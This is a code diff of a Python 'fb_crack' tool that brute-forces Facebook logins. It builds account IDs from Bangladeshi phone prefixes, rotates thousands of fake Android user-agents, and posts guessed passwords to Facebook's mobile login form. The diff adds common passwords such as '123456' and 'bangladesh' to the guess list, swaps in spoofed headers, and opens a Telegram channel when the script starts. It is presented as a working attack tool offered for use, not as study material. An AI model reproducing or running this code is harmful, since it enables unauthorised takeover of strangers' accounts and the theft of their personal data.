@@ -50,41 +50,91 @@ import random
 ugen=[]
 for ar in range(5000):
     a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['5.1.1','6.0','7','8','9'])
+    c='SM-J3110 Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    d=random.randrange(40,138)
+    e='0'
+    f=random.randrange(3000,6000)
+    g=random.randrange(20,100)
+    h='Mobile Safari/537.36'
+    ua=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+    ugen.append(ua)
+
+import os
+
+import random
+
+ugen=[]
+for ar in range(5000):
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['6.0','7.0','8','9','10'])
+    c='Galaxy j5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    d=random.randrange(40,62)
+    e='0'
+    f=random.randrange(3000,6000)
+    g=random.randrange(20,100)
+    h='Mobile Safari/537.36'
+    ua=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+    ugen.append(ua)
+import os
+
+import random
+
+ugen=[]
+for ar in range(5000):
+    a='Mozilla/5.0 (Linux; Android'
     b=random.choice(['8','9','10','11','12','13','14','15'])
-    c='SAMSUNG SM-A3560) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/'
+    c='Infinix X688B Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    d=random.randrange(40,105)
+    e='0'
+    f=random.randrange(3000,6000)
+    g=random.randrange(20,100)
+    h='Mobile Safari/537.36'
+    ua=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+    ugen.append(ua)
+
+import os
+
+import random
+
+ugen=[]
+for ar in range(5000):
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['8','9','10','11','12','13','14','15'])
+    c='Redmi Note 8 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    d=random.randrange(40,141)
+    e='0'
+    f=random.randrange(3000,6000)
+    g=random.randrange(20,100)
+    h='Mobile Safari/537.36'
+    ua=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+    ugen.append(ua)
+import os
+
+import random
+
+ugen=[]
+for ar in range(5000):
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['8','9','10','11','12','13','14','15'])
+    c='Redmi Note 5 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    d=random.randrange(40,138)
+    e='0'
+    f=random.randrange(3000,6000)
+    g=random.randrange(20,100)
+    h='Mobile Safari/537.36'
+    ua=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+    ugen.append(ua)
+import os
+
+import random
+
+ugen=[]
+for ar in range(5000):
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['8','9','10','11','12','13','14','15'])
+    c='SM-A045F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
     d=random.randrange(40,115)
-    e='0'
-    f=random.randrange(3000,6000)
-    g=random.randrange(20,100)
-    h='Mobile Safari/537.36'
-    ua=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
-    ugen.append(ua)
-import os
-
-import random
-
-ugen=[]
-for ar in range(5000):
-    a='Mozilla/5.0 (Linux; Android'
-    b=random.choice(['8','9','10','11','12','13','14','15'])
-    c='Mi MIX 3 Build/PKQ1.180729.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-    d=random.randrange(40,99)
-    e='0'
-    f=random.randrange(3000,6000)
-    g=random.randrange(20,100)
-    h='Mobile Safari/537.36'
-    ua=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
-    ugen.append(ua)
-import os
-
-import random
-
-ugen=[]
-for ar in range(5000):
-    a='Mozilla/5.0 (Linux; Android'
-    b=random.choice(['8','9','10','11','12','13','14','15'])
-    c='Nokia X6 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-    d=random.randrange(40,122)
     e='0'
     f=random.randrange(3000,6000)
     g=random.randrange(20,100)
@@ -93,11 +143,11 @@ for ar in range(5000):
     ugen.append(ua)
 os.system("xdg-open https://t.me/fb_crack_termux_all_free_command")
 logo =("""
-\033[1;32m    ❝𝐖𝐢𝐧𝐧𝐞𝐫 𝐁𝐲 𝐀𝐒𝐇𝐈𝐊❞
-\033[1;36m    Free Tool
-\033[1;32m    Version 0.3
+\033[1;32m                   ❝𝐖𝐢𝐧𝐧𝐞𝐫 𝐁𝐲 𝐀𝐒𝐇𝐈𝐊❞
+\033[1;36m                       Free Tool
+\033[1;32m                      Version 0.4
 \033[1;91m╔═════════════════════════╗
-\033[1;92m   	❝𝐖𝐢𝐧𝐧𝐞𝐫 𝐁𝐲 𝐀𝐒𝐇𝐈𝐊❞
+\033[1;92m   ❝𝐖𝐢𝐧𝐧𝐞𝐫 𝐁𝐲 𝐀𝐒𝐇𝐈𝐊❞
 \033[1;91m╚═════════════════════════╝""") 
  
 def Alhaj():
@@ -130,7 +180,7 @@ def Alhajs():
     os.system("clear")
     print(logo)
     print("\033[1;91m╔════════════════════════════════════════════╗")
-    print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ : \033[1;31m[\033[1;32m016\033[1;31m] [\033[1;32m017\033[1;31m] [\033[1;32m018\033[1;31m] [\033[1;32m019\033[1;31m] \033[1;31m  ║")
+    print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ : \033[1;31m[\033[1;32m016\033[1;31m] [\033[1;32m017\033[1;31m] [\033[1;32m018\033[1;31m] [\033[1;32m019\033[1;31m] [\033[1;32m013\033[1;31m] [\033[1;32m014\033[1;31m] \033[1;31m║")
     print("\033[1;91m╚════════════════════════════════════════════╝")
     code = input('\033[1;32m ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ :\033[1;36m ')
     os.system('clear')
@@ -153,7 +203,7 @@ def Alhajs():
         print(f'\033[1;91m║\033[1;92m Tool Winner 𝐀𝐒𝐇𝐈𝐊 ')
         print("\033[1;91m╚═════════════════════════════════════╝")
         for love in user:
-            pwx = [love,love[2:],code+love[:3],'jannat']
+            pwx = [love,love[2:],code+love[:3],'jannat','708090','908070','123456','bangla','bangladesh','i love you','a123456',]
             uid = code+love
             Fb_crack.submit(Alhajm,uid,pwx,tl)
     print("\033[1;91m╔═══════════════════════════╗")
@@ -184,13 +234,12 @@ def Alhajm(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'p.facebook.com',
-    'method': 'GET',
-    'scheme': 'https',
+            header_freefb = {'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
     'dpr': '2.75',
+    'referer': 'https://www.google.com/',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
